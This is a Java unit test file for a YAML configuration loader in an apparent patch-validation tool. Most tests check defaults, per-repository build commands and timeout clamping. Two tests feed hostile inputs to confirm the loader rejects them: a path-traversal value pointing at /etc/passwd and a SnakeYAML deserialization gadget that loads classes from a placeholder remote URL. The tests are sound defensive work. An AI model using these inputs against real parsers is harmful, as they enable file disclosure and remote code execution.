package com.patchlens.sandbox;

import com.patchlens.service.ValidationConfig;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class ValidationConfigLoaderTest {

    @TempDir Path root;

    @Test
    void usesDefaultsWhenNoConfigFile() throws Exception {
        var loaded = ValidationConfigLoader.load(root, 900);
        assertThat(loaded.source()).isEqualTo("defaults");
        assertThat(loaded.config().getBuild().command()).isEqualTo("mvn -q -DskipTests test-compile");
        assertThat(loaded.config().getStaticAnalysis().isEnabled()).isFalse();
    }

    @Test
    void loadsRepositorySpecificCommandsAndClampsTimeouts() throws Exception {
        Files.writeString(root.resolve("patchlens.yaml"), """
                buildFile: service/pom.xml
                build:
                  command: mvn -q -pl service -am -DskipTests test-compile
                staticAnalysis:
                  command: mvn -q -pl service spotless:check
                tests:
                  command: mvn -q -pl service test
                timeouts:
                  compileSeconds: 99999
                  testSeconds: 120
                """);
        ValidationConfig cfg = ValidationConfigLoader.load(root, 900).config();

        assertThat(cfg.getBuildFile()).isEqualTo("service/pom.xml");
        assertThat(cfg.getBuild().command()).contains("-pl service");
        assertThat(cfg.getStaticAnalysis().isEnabled()).isTrue();
        assertThat(cfg.getTimeouts().compileSeconds()).isEqualTo(900);
        assertThat(cfg.getTimeouts().testSeconds()).isEqualTo(120);
    }

    @Test
    void rejectsUnsafeBuildFilePath() throws Exception {
        Files.writeString(root.resolve(".patchlens.yml"), "buildFile: ../../etc/passwd\n");
        assertThatThrownBy(() -> ValidationConfigLoader.load(root, 900)).isInstanceOf(IOException.class);
    }

    @Test
    void safeConstructorRefusesArbitraryJavaTypes() throws Exception {
        Files.writeString(root.resolve("patchlens.yaml"),
                "build: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x\"]]]]\n");
        assertThatThrownBy(() -> ValidationConfigLoader.load(root, 900)).isInstanceOf(Exception.class);
    }
}
